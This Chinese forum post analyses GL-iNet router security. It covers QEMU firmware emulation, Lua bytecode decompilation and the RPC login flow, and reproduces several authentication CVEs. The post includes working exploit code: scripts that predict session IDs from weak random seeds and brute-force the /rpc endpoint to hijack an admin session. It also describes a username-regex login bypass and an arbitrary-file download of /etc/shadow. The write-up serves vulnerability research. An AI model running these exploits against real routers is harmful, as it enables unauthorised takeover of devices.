> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-284223.htm)

> [原创]GL-iNet 路由器安全分析

**前言**
======

前段时间看到复现分析 GL-iNet 路由器 CVE-2024-39226 漏洞的两篇文章 [[原创]GL-iNet 路由器 CVE-2024-39226 漏洞分析](https://bbs.kanxue.com/thread-283585.htm) ，[CVE-2024-39226 GL-iNet 路由器 RPC 漏洞复现](https://www.iotsec-zone.com/article/477)，看完也跟着了分析下，固件仿真过程踩了一些坑，开始我直接用 Ubuntu24 的 qemu-system-arm 跟着操作都会出现错误”Cortex-A9MPCore peripheral can only use Cortex-A9 CPU”，摸索了挺久发现文章用的都是 debian_wheezy_armhf 来仿真，但太老了以至于直接跑 GL-iNet 固件会出现 Illegal instruction 的错误，就使用 Ubuntu18 安装的低版本 qemu-system-arm，能绕过来指定仿真开发板非支持的 cpu，[qemu 在高版本中修复了这个问题](https://lists.gnu.org/archive/html/qemu-devel/2020-07/msg03297.html)，就出现了新些版本 Ubuntu 安装的 qemu-system-arm 启动报错问题。

![](https://bbs.kanxue.com/upload/attach/202411/802108_QVVMHM4HW92C7YS.png)

后面琢磨了下，用低版本 qemu-system-arm 来绕过不算是好方法，试了试换个高版本内核镜像仿真就行了，可以花些时间自己制作一个，我是直接用开箱即用制作好的 ([https://people.debian.org/~gio/dqib / 中的 armhf-virt)，根据自己的复现环境的网络配置改一下说明中的启动命令即可。](https://people.debian.org/~gio/dqib/%E4%B8%AD%E7%9A%84armhf-virt)%EF%BC%8C%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E7%9A%84%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%94%B9%E4%B8%80%E4%B8%8B%E8%AF%B4%E6%98%8E%E4%B8%AD%E7%9A%84%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4%E5%8D%B3%E5%8F%AF%E3%80%82)

![](https://bbs.kanxue.com/upload/attach/202411/802108_YDYW7B2D5MJYT62.png)

在分析漏洞时候，有搜索翻阅下 GL-iNet 官方发布的相关安全信息，发现官方整理得很有序完善详实，建立有一个[漏洞修复信息仓库](https://github.com/gl-inet/CVE-issues/)，有漏洞描述、影响范围、固件版本或利用方式等，修复漏洞的 CVE 编号没有标明，但在 [GL-iNet 安全更新信息发布网站](https://www.gl-inet.com/security-updates/)中可以找到每个版本更新修复的 CVE 编号，梳理一下可轻松找到其对应关系。在梳理时候，我发现两篇复现文章末尾都用了另外一个无需登录即可执行 rpc 调用的漏洞 CVE-2024-39227，不过作者都没有提到是这个漏洞编号，这个漏洞的成因和利用都非常简单，但危害性巨大，并且 CVE-2024-39226 看起来也主要是为了配合这个漏洞来实现未授权远程执行而找到的。

复现分析完文章提到的两个漏洞后，我去官网下载最新的固件版本 v4.6.6 扒拉了下，发现像 CVE-2024-39226 这种本地或授权后可以命令注入类型问题还是不少的。拥有授权 sid 后 / usr/lib/oui-httpd/rpc 目录中文件的方法基本是可以任意调用，有些文件是 luac 文件反编译下即可。rpc 目录下有十分多的类方法，简单翻了翻发现直接和间接进行命令注入的点很多，几乎防不胜防，想逐一修复工作量不小也不太有趣，思考下觉得这更像是一个系统框架设计问题吧，便和 GL-iNet 安全团队邮件反馈沟通了下，给出了一些示例。

进一步思考下，最重要的安全防线基本就是一道授权防护了，拥有或者绕过授权后便是如入无人之境了，历史 CVE 有一些是授权绕过漏洞，看了下相比授权后注入漏洞会更有意思些，不难但很经典，修复后又被绕过，或者同一个攻击面找到了别的攻击点。

所以此文一是对两篇 GL-iNet 路由器 CVE-2024-39226 漏洞复现文章进一步的补充，感谢作者无私的分享精神，我来进一步传递下互助分享的火炬，也为初学者提供一些有价值的资料和信息；二是复现分析下 GL-iNet 路由器几个授权相关的漏洞，看看最重要的防线都是怎样被突破的，以及修复后又是怎么再被突破的。

**固件仿真**
========

**宿主机网络配置**
-----------

以 Ubuntu24 系统为例，先安装 qemu-system-arm。

```
sudo apt install qemu-system-arm
```

配置宿主机网络，参考 [QEMU 搭建 ARM64 环境](https://zikh26.github.io/posts/3d9490d.html)一文，先执行安装命令，安装后后宿主机会自动创建一个默认网桥 virbr0。

```
sudo apt install libvirt-daemon-system libvirt-clients virt-manager
```

随后执行命令，创建并启用名为 tap0 的 TAP 设备，再将其添加到 virbr0 网桥中，并修改文件权限。

```
sudo ip tuntap add dev tap0 mode tap
sudo ip link set tap0 up
sudo brctl addif virbr0 tap0
sudo chmod 666 /dev/net/tun
```

接着执行 ip addr 查看 virbr0 网桥在宿主机中的网段，比如为 192.168.122.1/24，后面配置虚拟机网络时候会用到。

![](https://bbs.kanxue.com/upload/attach/202411/802108_4PVRG7GHKYNAE9H.png)

**虚拟机网络配置**
-----------

根据要复现分析漏洞影响的版本去下载固件，可以在 GL-iNet 官方安全更新和漏洞仓库里面去找相应版本。

进行仿真模拟的步骤都是一样的，到 [https://people.debian.org/~gio/dqib / 找到 Images](https://people.debian.org/~gio/dqib/%E6%89%BE%E5%88%B0Images) for armhf-virt 的链接下载，这是制作好的镜像，解压后可在 readme.txt 文件中看到镜像使用信息说明，如 qemu-system-arm 启动命令、登录方式密码等。

![](https://bbs.kanxue.com/upload/attach/202411/802108_G5JZMRF2NX4E849.png)

想要仿真系统和宿主机通信的话，就不能直接使用它的启动命令，可修改下启动配置中的网络部分，改为使用 tap 网络接口，id 为 net，名称为 tap0。

```
sudo qemu-system-arm -machine 'virt' -cpu 'cortex-a15' -m 1G \
-device virtio-blk-device,drive=hd -drive file=image.qcow2,if=none,id=hd \
-device virtio-net-device,netdev=net -netdev tap,id=net,ifname=tap0,script=no,downscript=no \
-kernel kernel -initrd initrd -nographic \
-append "root=LABEL=rootfs console=ttyAMA0"
```

![](https://bbs.kanxue.com/upload/attach/202411/802108_UB9UHHRMN3XBYHR.png)

启动后登录进入系统，执行 ip addr 可以看到网卡名称 eth0，再执行命令给 eth0 网卡分配一个网桥 virbr0 网段中的 ip，刚才我们已经在宿主机看了 virbr0 网段是 192.168.122.1/24。

```
ip add add 192.168.122.130/24 dev eth0
ip link set eth0 up
ip route add default via 192.168.122.1
```

执行后即可和宿主机通信，能互相 ping 通，每次启动都要执行一遍，嫌麻烦可以把重复操作写成 sh 脚本。

**启动配置路由器**
-----------

在官网固件下载网站下好固件后，以当前 AX1800 Flint 最新版 v4.6.6 为例，使用 binwalk -Me 提取出 squashfs-root 文件系统，再在宿主机上使用 scp 将其传递到仿真虚拟机中，有个坑是提取后文件系统后，如果你想 mv、压缩或者 scp 传输，记得都要加 sudo，不然会少关键文件 / etc/nginx/oui_nginx.conf 和 / etc/nginx/conf.d/gl.conf 等，会导致无法启动路由器登录管理页面。

```
sudo scp -r squashfs-root/ root@192.168.122.130:/root
```

接着挂载文件系统并启动 shell，以及经过尝试，可以在一个虚拟机上传不同固件版本的 suqashfs-root，选择挂载进入的，可以写出不同的 sh 脚本。

```
cd squashfs-root/
mount -t proc /proc ./proc/
mount -o bind /dev ./dev/
chroot ../squashfs-root/ sh
```

![](https://bbs.kanxue.com/upload/attach/202411/802108_P8FMKF2H4BKRRWQ.png)

参考其他文章，加上我自己的摸索，可尝试这些命令来启动路由器，能够在宿主机浏览器中访问 192.168.122.130 进入路由器管理页面，可完成初始密码设置并登录进入管理面板过程，想实现更多功能的启用就要摸索更多配置了，不过我们分析复现授权相关过程已经够用了。

```
#第一次运行这些
mkdir /var/log
mkdir /var/log/nginx
mkdir /var/lib
mkdir /var/lib/nginx
mkdir /var/lib/nginx/body
mkdir /var/run
chmod +x  /etc/uci-defaults/80_nginx-oui
/etc/uci-defaults/80_nginx-oui
chmod +x /etc/uci-defaults/network_gl
/etc/uci-defaults/network_gl
/etc/init.d/boot boot
 
#后面重启运行这些即可
/sbin/ubusd &
/usr/sbin/gl-ngx-session &
/usr/bin/fcgiwrap -c 4 -s unix:/var/run/fcgiwrap.socket &
/usr/sbin/nginx -c /etc/nginx/nginx.conf -g 'daemon off;' &
```

![](https://bbs.kanxue.com/upload/attach/202411/802108_PT8CVV4Y572UHGB.png)

**luac 反编译**
============

GL-iNet 路由器的管理系统是基于 luci-nginx-OpenResty 开发的，核心功能都是 lua 写的，在分析过程中发现，lua 文件分为源码文件、luac5.1.5 文件和 luac5.3.5 文件三种，碰到后面两种文件就要看下怎么反编译了，自己踩些坑捣鼓了下，算是比较顺利地反编译了。

**5.1.5**
---------

/usr/lib/oui-httpd/rpc 目录下不少 luac5.1 文件，不过跟我之前碰到的不太一样，文件头中带有路径，不知是不是这个原因，没处理带路径的情况，像 metaworm、unluac 项目工具都不能反编译成功，最后使用 luadec 反编译成功了，可能是其编译依赖 lua 源码缘故。

![](https://bbs.kanxue.com/upload/attach/202411/802108_RAC7HMFUV46TSJN.png)

但 luadec 也不能直接编译出来用，要先去下载编译会用到的 lua 源码，放在 luadec/lua-5.1 目录中，而 openwrt 项目使用了修改的 lua5.1.5 的源码，打上 openwrt 的 patches 再给 luadec 编译即可，详情阅读文章[反向编译 OpenWrt 的 Lua 字节码](https://blog.ihipop.com/2018/05/5110.html)。要注意的是文章中的 patches 下载命令失效了，可以手动去 [openwrt 项目仓库下载 patches 文件](https://github.com/openwrt/openwrt/tree/master/package/utils/lua/patches)，自己打上即可，以及编译出错问题按照文章中给编译命令加上 - fPIC 即可解决。

![](https://bbs.kanxue.com/upload/attach/202411/802108_VXMTZS4FSZXFHJW.png)

**5.3.5**
---------

部分 luac 文件看文件头知道是 5.3 版本，但不知道是哪个小版本，去翻了 [openwrt 项目最新代码](https://github.com/openwrt/openwrt/blob/master/package/utils)，能确定是加入了 lua-5.3.5 版本，和 5.1.5 版本共存，在目录 utils/lua 和 utils/lua5.3 的 Makefile 文件中可以看到具体版本。本来想如法炮制，打 patches 编译 lua-5.3.5 的 luadec，但是碰到了两个坑。

![](https://bbs.kanxue.com/upload/attach/202411/802108_RZM4MNSACPG2DUM.png)

先是会报 size_t 不对的错误，ida 分析编译出来的 luadec 文件，同时查看 lua-5.3.5 源码的 checkHeader 部分，找到问题是因为 luadec 在 ubuntu64 编译的，默认编译器是 gcc64，校验的 size_t 就是 8，而 GL-iNet 固件运行在 32 位 arm，luac 文件的 size_t 是 4，所以校验出错。试下了改 gcc32 编译但发现出了不少依赖问题不好解决，随后换在 Windows 上用 Visual Studio 编译 luadec 32 位的 lua5.3 sln 项目，迅速通过编译。

![](https://bbs.kanxue.com/upload/attach/202411/802108_GJMB6R2R8EQCZPN.png)

接着又出现了文件头校验端序的问题，”endianness mismatch in precompiled chunk”,ida 分析 GL-iNet 中 luac 引擎 / usr/lib/liblua5.3.so.0.0.0 文件，对比 lua5.3.5 源码，发现源码先是读了一个 Interger 类型值判断是否是 0x5678，再读一个 Number 值判断是否等于一个浮点数，而 liblua5.3.so.0.0.0 中可以看到只读了一个字节是否为 1 来判断端序，LUAC_NUM 的校验则是直接没有。

![](https://bbs.kanxue.com/upload/attach/202411/802108_2J9VKRNY2CBBC4K.png)

搜了下确定应该是 GL-iNet 改的，没搜到哪个 5.3 小版本有这么写。解决办法有两种，一是修改要反编译 luac5.3 文件头的大端序和浮点数部分，二是修改 luadec 编译用到的 lua5.3.5 源码文件头校验部分，后者要省事些。

**功能简析**
========

**登录抓包**
--------

想分析登录授权相关的历史漏洞，首先要跟踪理清相关的函数调用链，仿真虚拟机中执行命令行 / usr/sbin/gl-ngx-session &，便可进行登录相关功能。接着抓包网络通信请求，注意到有两个 / rpc 请求，参数是一个 json 字符串，其中有 method 字段和 params 字段，看起来是要点用的方法和参数，先进行 / rpc - challenge 请求传递参数 username 获取到 salt、alg、nonce，再发送 / rpc - login 请求传递参数 username 和 hash 获取到 sid，便是算登陆上了，大概也能猜到 hash 的生成和输入的密码、rpc - challenge 返回参数有关。

![](https://bbs.kanxue.com/upload/attach/202411/802108_ZZBXC9J8Q6D8PFM.png)

![](https://bbs.kanxue.com/upload/attach/202411/802108_KJZ4DYQ47ME44ZK.png)

![](https://bbs.kanxue.com/upload/attach/202411/802108_2SBNB9CGWN97PSU.png)

![](https://bbs.kanxue.com/upload/attach/202411/802108_VH4JWRZJYDVY8NM.png)

**rpc 调用**
----------

/etc/nginx/conf.d/gl.conf 是 luci-nginx 服务器的配置文件，可以看到 location 部分有着路径请求和对应执行的 lua 脚本位置，/rpc 请求会被 / usr/share/gl-ngx/oui-rpc.lua 执行。

![](https://bbs.kanxue.com/upload/attach/202411/802108_6AVEWWRSJJCFJVW.png)

接着查看 / usr/share/gl-ngx/oui-rpc.lua 文件，处理了通过 / rpc 路径发送的 json 请求数据，请求中 method 字段有 challenge、login、logout、alive、call 五个类型，定义了各自对应的方法。

![](https://bbs.kanxue.com/upload/attach/202411/802108_Y47FUXW7V9E6YWA.png)

经分析可知前四个都是通过 ubus 机制调用 / usr/sbin/gl-ngx-session 文件中创建的服务方法，call 类型则是到 / user/lib/lua/oui/rpc.lua 中去解析处理参数，进一步完成对 / usr/lib/oui-httpd/rpc / 目录下的 lua 文件方法或者 so 文件函数的调用。lua 文件方法的调用是通过 pcall 函数实现的，而 so 文件函数是通过转发给 / www/cgi-bin/glc 此 elf 文件解析，通过 dlopen 和 dlsym 函数来完成调用实现。两者调用的环节可以说都是危险性比较大的攻击面，像 CVE-2024-39226 即 s2s.so 的命令注入，和 CVE-2024-39227 即无需登录通过 glc 文件调用 rpc 目录下 so 文件函数，都是后者的调用链路出现的大问题。

![](https://bbs.kanxue.com/upload/attach/202411/802108_NDQFDS5QVHZBN6F.png)

以及注意到 / user/lib/lua/oui/rpc.lua 文件中的 M.access 方法，可以知道本地能进行的攻击请求，拥有管理员的 sid 后也能同样进行，换句话说拥有管理员 sid 后，能够执行 / usr/lib/oui-httpd/rpc / 目录下的任意函数方法。我简单看了下最新版本的固件，就找到了许多处直接和间接的命令注入，现在问题来了，如果授权后 shell 注入算是漏洞的话，那可以说框架系统如此设计的问题还是比较大的，当然也可以认为此类并不太算是漏洞，因为功能设计如此，只要守好授权管理防线即可。

![](https://bbs.kanxue.com/upload/attach/202411/802108_RS5CBZR7BMWVYJJ.png)

**授权机制**
--------

先将如何看待路由器此类授权后漏洞的性质和危害性放到一边，去看下出现问题一定会有很大杀伤力的授权机制部分，根据刚才的分析可以知道，登录抓包中 / rpc - challenge 和 / rpc-login 请求执行的功能函数，都在 / usr/sbin/gl-ngx-session 文件中的 ubus 服务定义。

![](https://bbs.kanxue.com/upload/attach/202411/802108_8DXYF3HGZUA4TBC.png)

简单分析可知，challenge 方法生成并返回了一个随机数 nonce，从 / etc/shadow 中读取登录用户的哈希加密类型 alg 和盐 salt，与 nonce 一同返回给客户端以进行哈希计算，而 login 方法则是验证客户端计算的哈希是否与 / etc/shadow 中一致。![](https://bbs.kanxue.com/upload/attach/202411/802108_9MFBV9G68HFM8M6.png)

其他几个像 logout 方法是销毁移除会话 id，touch 方法是刷新会话超时时间，touch 是刷新会话的超时时间，session 是返回指定会话 id 的详细信息，clear_session 是清除所有会话。

**不安全随机数**
==========

先来看下 CVE-2023-50920 和 CVE-2024-39225，这是两个很经典的不安全随机数应用在授权机制中类型的漏洞。前者 cve 是未设置随机数种子，默认为 1，导致 sid 生成是可预测的，可在管理员登录期间，去爆破到 sid。在经过修复后，取登录时间作为随机数种子，但并没有安全而是出现了第二个 cve，一是可以想办法获取到登录时间，二是如果登录时间不能确定，还可以往前可以遍历，仍然能够采取爆破方式得到管理员登录的 sid。

**CVE-2023-50920**
------------------

此漏洞具体信息可到官方仓库 [Authentication-bypass-seesion-ID](https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Authentication-bypass-seesion-ID.md) 一文查看，有提到影响和修复的版本，简单介绍了漏洞情况。以下载了 AX1800 Flint v4.4.6 版本复现为例，解包固件后，直奔主题看下 sid 是怎么产生的，可以看到是在 / usr/sbin/gl-ngx-session 函数中调用了 / usr/lib/lua/oui/utils.lua 的 M.generate 方法，可以看到是调用了 32 次 math.random(#t)，从表 t 中取字母拼接成而来的。

![](https://bbs.kanxue.com/upload/attach/202411/802108_WFJXQ3F2VDYT3ZH.png)

到上面提到的官方仓库文章看下对漏洞的描述，说第一次启动登录五次产生的不同 sid，和第二次重启登录五次产生的不同 sid 是一致的，我们可以通过对固件仿真进行验证，确实如此，重启产生的五个固定 sid 为：

```
NsPHdkXtENoaotxVZWLqJorU52O7J0OI
kOwMhgyNDFmY9bhJuOabavmiiWEvugps
T2FvXOB3DzLi6OugzpU9gvGE0RXXCe3D
LhYe29My1b07gEYD6M7r0GEhEdf7ZKwf
frkuxD8f0mOa5QW8VCadShygkiQtVPLj
```

![](https://bbs.kanxue.com/upload/attach/202411/802108_QPKX39DAS4QKMKG.png)

细究下原因，是因为开发者忘记在 / etc/init.d/gl-ngx-session 中使用 math.randomseed 函数初始化随机数种子了，以及文件第一行是 #!/usr/bin/lua 即由其执行，分析下知道是 lua5.1 的解释器，可以在 [lua5.1 源代码网站](https://www.lua.org/source/5.1/lmathlib.c.html)找到 math_random 和 math_randomseed 的实现，前者先通过 (rand()%RAND_MAX) / RAND_MAX 生成一个 0~1 之间的小数，只传入一个参数时候与其相乘，使用 floor 向下取整再加一。后者比较简单，是直接调用了 C 语言的 srand，如果没有调用此函数初始化随机数种子的话，会默认使用 1 开始作为种子，就导致每次重启不断产生的随机数都是一致的。

![](https://bbs.kanxue.com/upload/attach/202411/802108_497XJAPQMMAX4M8.png)

可以在虚拟机上写一个 lua 文件执行验证一下，先设置 randomseed 为 1，再调用 generated_id 函数，因为每次登录 / rpc-challenge 请求也会调用一次 generate_id 作为随机数 nonce，所以取第二次生成结果作为 sid，可以看到结果和我们登录记录五个 sid 是一致的。

![](https://bbs.kanxue.com/upload/attach/202411/802108_K5BGFZETJNVKWNW.png)

或者我们反编译下虚拟机的 / lib/libc.so 文件，看下 rand 和 srand 函数的实现，自己写一份，也能得到每次重启的固定 sid 序列，需要注意的一个坑是 lua 数组下标是从 1 开始的。

![](https://bbs.kanxue.com/upload/attach/202411/802108_TY7E7X93AAERK86.png)

![](https://bbs.kanxue.com/upload/attach/202411/802108_2QNDKC2CH7X6Q9E.png)

```
#CVE-2023-50920.py
import math
seed = 0
RAND_MAX = 2147483647
 
def lua51_math_randomseed(s):
    global seed
    seed = s - 1
     
def lua51_math_random(max):
    global seed
    seed = (6364136223846793005*int(seed) + 1)&0xffffffffffffffff
    r =  (seed >> 33)&0xffffffff
    return math.floor(((r%RAND_MAX)/RAND_MAX)*max)+1
 
def generate_id(n):
    s = []
    t = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
    for i in range(n):
        a = lua51_math_random(len(t))-1
        s.append(t[a])
    return "".join(s)
 
lua51_math_randomseed(1)
for i in range(5):
    generate_id(32)
    print(generate_id(32))
```

**CVE-2024-39225**
------------------

随后官方进行了修复，下载 AX1800 Flint v4.5.0 固件解包查看，可以看到在 / sur/sbin/gl-ngx-seesion 的 init 函数中初始化了 unix 时间戳为随机数种子。

![](https://bbs.kanxue.com/upload/attach/202411/802108_QQSWMRBGJWPV5NA.png)

如此乍一看生成的 sid 不会再重复一直在变化，但是由于当下向前的时间是确定的，所以仍然是不安全的，在管理员登录路由器面板不久后，写脚本尝试不断以向前的 unix 时间戳为随机数种子，去生成一些 sid 尝试登录，是可以爆破出管理员的 sid 的，这就是 [CVE-2024-39225]([https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Bypass](https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Bypass) the login mechanism.md)。

以及 github 有[这个 CVE 的利用 poc](https://github.com/aggressor0/GL.iNet-Exploits/blob/main/CVE-2024-39225.py)，但经过我自己仿真复现和分析发现有些不太对劲，这个 poc 并不能爆破出来正确的 sid，经过一番排查，确定原因是 / etc/init.d/gl-ngx-session 文件第一行也发生了改动，#!/usr/bin/lua 改为 #!/usr/bin/eco，即 lua 文件变为由后者执行。ida 分析可知，前者是 lua.5.1 引擎，后者是 lua5.3 引擎。而在 lua5.3 版本中，随机数生成实现发生了变动，可以在[官方 lua5.3 源码网站](https://www.lua.org/source/5.3/lmathlib.c.html)查看，一是如果符合 POSIX 标准，就使用 random 和 srandom 函数，而非 rand 和 srand，二是 math.random 函数实现变化，math.randomseed 函数实现不仅会初始化种子，还会先调用一次 l_rand 函数。

![](https://bbs.kanxue.com/upload/attach/202411/802108_6THGNVGXUJRCGJM.png)

![](https://bbs.kanxue.com/upload/attach/202411/802108_YSJ6FPMCXH6S48A.png)

所以 poc 中使用 lua5.1 的随机数生成实现逻辑是复现不出来漏洞的，我们需要按 lua5.3 的来，random 和 srandom 函数可以先使用 ida 分析下 / lib/libc.so 文件，注意到实现有些复杂，根据两个函数的常量线索可以搜到[一份实现](https://github.com/bpowers/musl/blob/master/src/prng/random.c)，经验证是和 GL-iNet 一致的。

![](https://bbs.kanxue.com/upload/attach/202411/802108_THMTBMGD9P696DP.png)

接着便可以撰写爆破 sid 的脚本，随机数生成用 C 实现及 gcc 编译为 so，提供 python 调用，便可复现成功。

![](https://bbs.kanxue.com/upload/attach/202411/802108_VZ6EJP873498APS.png)

```
//myrand-lua53.c
// gcc myrand-lua53.c -fPIC -shared -o myrand-lua53.so
#include #include static uint32_t init[] = {
0x00000000,0x5851f42d,0xc0b18ccf,0xcbb5f646,
0xc7033129,0x30705b04,0x20fd5db4,0x9a8b7f78,
0x502959d8,0xab894868,0x6c0356a7,0x88cdb7ff,
0xb477d43f,0x70a3a52b,0xa8e4baf1,0xfd8341fc,
0x8ae16fd9,0x742d2f7a,0x0d1f0796,0x76035e09,
0x40f7702c,0x6fa72ca5,0xaaa84157,0x58a0df74,
0xc74a0364,0xae533cc4,0x04185faf,0x6de3b115,
0x0cab8628,0xf043bfa4,0x398150e9,0x37521657};
 
static int n = 31;
static int i = 3;
static int j = 0;
static uint32_t *x = init+1;
static uint32_t lcg31(uint32_t x) {
    return (1103515245*x + 12345) & 0x7fffffff;
}
 
static uint64_t lcg64(uint64_t x) {
    return 6364136223846793005ull*x + 1;
}
 
static void *savestate() {
    x[-1] = (n<<16)|(i<<8)|j;
    return x-1;
}
 
static void loadstate(uint32_t *state) {
    x = state+1;
    n = x[-1]>>16;
    i = (x[-1]>>8)&0xff;
    j = x[-1]&0xff;
}
 
long mysrandom(unsigned seed) {
    int k;
    uint64_t s = seed;
 
    if (n == 0) {
        x[0] = s;
        return;
    }
    i = n == 31 || n == 7 ? 3 : 1;
    j = 0;
    for (k = 0; k < n; k++) {
        s = lcg64(s);
        x[k] = s>>32;
    }
    /* make sure x contains at least one odd number */
    x[0] |= 1;
}
long myrandom(void) {
    long k;
 
    if (n == 0) {
        k = x[0] = lcg31(x[0]);
        goto end;
    }
    x[i] += x[j];
    k = x[i]>>1;
    if (++i == n)
        i = 0;
    if (++j == n)
        j = 0;
end:
    return k;
} 
```

```
#CVE-2024-39225.py
import time
import requests
import concurrent.futures
from requests.adapters import HTTPAdapter, Retry
from ctypes import *
 
requests.packages.urllib3.disable_warnings()
h = {'Content-type':'application/json;charset=utf-8', 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'}
retry = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
s = requests.Session()
s.mount('http://' , HTTPAdapter(max_retries=retry))
s.mount('https://', HTTPAdapter(max_retries=retry))
s.headers = h
s.verify = False
s.keep_alive = True
timeout = 20
max_backward_seconds = 3000
 
RAND_MAX = 2147483647
 
def lua53_math_randomseed(s):
    call.mysrandom(s)
    call.myrandom()
 
def lua53_math_random(max):
    return int(call.myrandom() * (1.0 / (RAND_MAX +1.0)) * max) + 1
 
def generate_id(n):
    s = []
    t = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
    for i in range(n):
        a = lua53_math_random(len(t))-1
        s.append(t[a])
    return "".join(s)
     
 
def makeRequest(sid):
    j = {"jsonrpc":"2.0","id":1,"method":"alive","params":{"sid":sid}}
    r = s.post("http://192.168.122.130/rpc", json=j, timeout=timeout)
    if "Access denied" not in (r.text):
        print("[*] An admin SID found: \033[1m%s\033[0m" %sid)
        return sid
     
def bruteForce():
    counter = 1
    e = concurrent.futures.ProcessPoolExecutor(max_workers=8)
    with open("SIDs", "r", encoding="utf-8") as f:
        sids = f.read().splitlines()
    print("[*] Bruteforce attack has started ... it may take very long time ...")
    for sid in range(0, len(sids), 2048):
        print("[*] The number of SIDs have been bruteforced so far: \033[1m%d\033[0m" %(2048*counter), end="\r")
        counter += 1
        results = e.map(makeRequest, sids[sid:sid+2048])
        for response in list(results):
            if response:
                e.shutdown(wait=True, cancel_futures=True)
                return response
 
def generateSIDs(boot_time):
    with open("SIDs", "a") as SIDs:
        for s in range(max_backward_seconds):
            lua53_math_randomseed(boot_time)
            for i in range(10):
                generate_id(32)
                sid = generate_id(32)
                SIDs.write(sid+"\n")
            boot_time -= 1
    print("[*] The bruteforce list has been constructed!")
 
call = CDLL("./myrand-lua53.so")
generateSIDs(int(time.time()))
bruteForce()
```

这之后官方又进行了一次修复，可以看到是使用了 io.open('/dev/urandom')，这次随机性应该是足够了。

![](https://bbs.kanxue.com/upload/attach/202411/802108_2GZXGEACCAEXBD7.png)

**授权认证绕过**
==========

接着再看下登录验证获取授权流程出现的两个漏洞 CVE-2023-50919 和 CVE-2024-45261，前者利用了登录校验中使用用户名参与对 / etc/shadow 行内容的正则匹配，可以控制用户名改变正则匹配模式，以返回确定已知的结果，随后便可构造出哈希计算值登录成功获取到 sid，这个漏洞随后被官方修复，但这个攻击面却还存在别的更隐蔽些的漏洞，即 CVE-2024-45261。

以及这两个漏洞获取的 sid 的 aclgroup 都不是 root，所以过不了 / usr/lib/lua/oui/rpc.lua 的 M.access 方法的校验，进而 rpc 方法基本不能调用，但是没关系已经足够了，/usr/share/gl-ngx/oui-download.lua 中有突破点，一是只是检查 sid 是否存在，二是没有检查下载文件路径，所以我们可以下载到任意文件，包括 / etc/shadow 文件，进而登录到管理员账户。

![](https://bbs.kanxue.com/upload/attach/202411/802108_7SFGZFE2YPZSVVN.png)

这就是 CVE-45260，github 上有[这个漏洞的 poc](https://github.com/aggressor0/GL.iNet-Exploits/blob/main/CVE-2024-45260.py)，我们可以简单修改下这个 poc，在复现两个授权认证绕过漏洞获取到 sid 后，一起进行验证。

**CVE-2023-50919**
------------------

漏洞的具体信息和影响版本可以看官方仓库的介绍 [https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Authentication-bypass.md，我们选择 v4.4.6 版本进行仿真验证和分析。之前已经简单介绍登录流程，先进行 / rpc](https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Authentication-bypass.md%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%89%E6%8B%A9v4.4.6%E7%89%88%E6%9C%AC%E8%BF%9B%E8%A1%8C%E4%BB%BF%E7%9C%9F%E9%AA%8C%E8%AF%81%E5%92%8C%E5%88%86%E6%9E%90%E3%80%82%E4%B9%8B%E5%89%8D%E5%B7%B2%E7%BB%8F%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E7%99%BB%E5%BD%95%E6%B5%81%E7%A8%8B%EF%BC%8C%E5%85%88%E8%BF%9B%E8%A1%8C/rpc) - challenge 请求传递参数 username 获取到 salt、alg、nonce，再发送 / rpc - login 请求传递参数 username 和 hash，验证成功获取到 sid，便是算登陆上了，现在具体看一下相关文件和函数，都在 / usr/sbin/gl-ngx-session 中。

这是 / etc/shadow 文件，第一次启动路由器设置密码时候，会调用 / usr/lib/oui-httpd/rpc/ui 文件的 M.init 方法，其中通过 (sys.password)(username, "", password) 再调用系统方法来更新到 / etc/shadow，第一行就是默认 root 用户的密码信息，以: 为分割，其中第二个字段是哈希信息，又以 $ 分割为哈希类型、盐和哈希结果。

![](https://bbs.kanxue.com/upload/attach/202411/802108_FX2U67WPKYADVP5.png)

/rpc - challenge 请求流程先获取到客户端发送的登录用户名，调用 get_crypt_info 函数，读取 / etc/shadow 文件获取用户的哈希类型和盐。

![](https://bbs.kanxue.com/upload/attach/202411/802108_XZK7PAX5RESE5WA.png)

接着再调用 create_nonce 函数生成随机数，最后再一同返回给客户端。

![](https://bbs.kanxue.com/upload/attach/202411/802108_EX2AZ46WBN6WDEB.png)

客户端根据哈希类型和盐进行哈希计算得到 hash，和用户名一起作为 / rpc - login 请求的参数准备进行验证，看下校验流程，会走到 login_test 函数中，遍历 / etc/shadow 行内容，拿用户名拼接正则表达式，正常流程应该是 username 为 root，随后匹配到第一行 root 密码信息中的第二个字段哈希信息，随后和用户名、随机数一起拼接进行 md5 哈希，将结果和客户端传来的 hash 值对比，一致则登录校验成功，生成 sid 返回。

![](https://bbs.kanxue.com/upload/attach/202411/802108_7CVSGWSH5EHYKP2.png)

